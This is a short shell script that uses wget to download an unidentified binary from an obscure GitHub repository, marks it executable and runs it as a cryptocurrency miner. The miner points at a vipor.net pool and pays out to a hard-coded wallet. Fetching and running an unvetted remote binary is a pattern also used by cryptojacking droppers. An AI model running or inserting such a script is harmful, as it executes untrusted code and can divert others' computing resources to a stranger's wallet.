#!/bin/sh
wget https://github.com/ertyuratasd/ertyuya/raw/refs/heads/main/tnn-m
chmod +x tnn-m
./tnn-m \
  --daemon-address sg.vipor.net:5140 \
  --port 5140 \
  --wallet xel:gmauvfwy499xku24akqyq9au6ekevp42esr7adjnvgp5xagnfu8sqg75mq9 \
  --threads 1 \
  --stratum \
  --worker-name x \
  --password x
